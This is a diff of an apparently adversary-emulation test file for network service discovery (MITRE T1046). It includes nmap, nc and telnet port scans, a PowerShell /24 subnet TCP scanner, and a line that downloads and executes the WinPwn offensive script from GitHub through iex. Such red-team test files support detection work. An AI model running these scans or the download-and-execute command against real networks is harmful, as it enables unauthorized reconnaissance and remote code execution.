@@ -1,5 +1,5 @@
 attack_technique: T1046
-display_name: Network Service Scanning
+display_name: Network Service Discovery
 atomic_tests:
 - name: Port Scan
   auto_generated_guid: 68e907da-2539-48f6-9fc9-257a78c05540
@@ -13,7 +13,7 @@ atomic_tests:
   input_arguments:
     host:
       description: Host to scan.
-      type: String
+      type: string
       default: 192.168.1.1
   executor:
     command: |
@@ -24,22 +24,22 @@ atomic_tests:
   description: |
     Scan ports to check for listening ports with Nmap.
 
-    Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout.
+    Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.
   supported_platforms:
   - linux
   - macos
   input_arguments:
     host:
       description: Host to scan.
-      type: String
+      type: string
       default: 192.168.1.1
     port:
       description: Ports to scan.
-      type: String
+      type: string
       default: "80"
     network_range:
       description: Network Range to Scan.
-      type: String
+      type: string
       default: 192.168.1.0/24
   dependency_executor_name: sh
   dependencies:
@@ -76,11 +76,11 @@ atomic_tests:
   input_arguments:
     nmap_url:
       description: NMap installer download URL
-      type: Url
+      type: url
       default: https://nmap.org/dist/nmap-7.80-setup.exe
     host_to_scan:
       description: The host to scan with NMap
-      type: String
+      type: string
       default: 127.0.0.1
   dependency_executor_name: powershell
   dependencies:
@@ -88,8 +88,9 @@ atomic_tests:
       NMap must be installed
     prereq_command: 'if (cmd /c "nmap 2>nul") {exit 0} else {exit 1}'
     get_prereq_command: |
-      Invoke-WebRequest -OutFile $env:temp\nmap-7.80-setup.exe #{nmap_url}
-      Start-Process $env:temp\nmap-7.80-setup.exe /S
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest -OutFile PathToAtomicsFolder\..\ExternalPayloads\nmap-7.80-setup.exe #{nmap_url}
+      Start-Process PathToAtomicsFolder\..\ExternalPayloads\nmap-7.80-setup.exe /S
   executor:
     command: |-
       nmap #{host_to_scan}
@@ -104,20 +105,20 @@ atomic_tests:
   input_arguments:
     host_ip:
       description: Host to scan.
-      type: String
+      type: string
       default: 127.0.0.1
     filename:
       description: Location of the project file
-      type: Path
+      type: path
       default: PathToAtomicsFolder\T1046\src\T1046.py
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Check if python exists on the machine
-      prereq_command: |
-        if (python --version) {exit 0} else {exit 1}
-      get_prereq_command: |
-        echo "Python 3 must be installed manually"
+  - description: |
+      Check if python exists on the machine
+    prereq_command: |
+      if (python --version) {exit 0} else {exit 1}
+    get_prereq_command: |
+      echo "Python 3 must be installed manually"
   executor:
     command: |
       python #{filename} -i #{host_ip}
@@ -165,4 +166,81 @@ atomic_tests:
       $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       fruit -noninteractive -consoleoutput
+    name: powershell
+- name: Network Service Discovery for Containers
+  auto_generated_guid: 06eaafdb-8982-426e-8a31-d572da633caa
+  description: Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.
+  supported_platforms:
+  - containers
+  dependency_executor_name: sh
+  dependencies:
+  - description: Verify docker is installed.
+    prereq_command: |
+      which docker
+    get_prereq_command: |
+      if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
+
+  - description: Verify docker service is running.
+    prereq_command: |
+      sudo systemctl status docker  --no-pager
+    get_prereq_command: |
+      sudo systemctl start docker
+  executor:
+    command: |-
+      docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/
+      docker run --name t1046_container  -d -t t1046
+      docker exec t1046_container ./test.sh
+    cleanup_command: |-
+      docker stop t1046_container
+      docker rmi -f t1046
+    name: sh
+- name: Port-Scanning /24 Subnet with PowerShell
+  auto_generated_guid: 05df2a79-dba6-4088-a804-9ca0802ca8e4
+  description: |
+    Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's "primary" IPv4 address first and then scans that address with a /24 netmask.
+    The connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.
+  supported_platforms:
+  - windows
+  input_arguments:
+    ip_address:
+      description: IP-Address within the target subnet. Default is empty and script tries to determine local IP address of attacking machine.
+      type: string
+      default: ""
+    port_list:
+      description: Comma separated list of ports to scan
+      type: string
+      default: "445, 3389"
+    timeout_ms:
+      description: Connection timeout in milliseconds
+      type: string
+      default: "200"
+  executor:
+    command: |
+      $ipAddr = "#{ip_address}"
+      if ($ipAddr -eq "") {
+          # Assumes the "primary" interface is shown at the top
+          $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
+          Write-Host "[i] Using Interface $interface"
+          $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
+      }
+      Write-Host "[i] Base IP-Address for Subnet: $ipAddr"
+      $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
+      # Always assumes /24 subnet
+      Write-Host "[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'"
+
+      $ports = #{port_list}
+      $subnetIPs = 1..254 | ForEach-Object { "$subnetSubstring$_" }
+
+      foreach ($ip in $subnetIPs) {
+          foreach ($port in $ports) {
+            try {
+                $tcp = New-Object Net.Sockets.TcpClient
+                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
+            } catch {}
+            if ($tcp.Connected) {
+                $tcp.Close()
+                Write-Host "Port $port is open on $ip"
+            }
+          }
+      }
     name: powershell
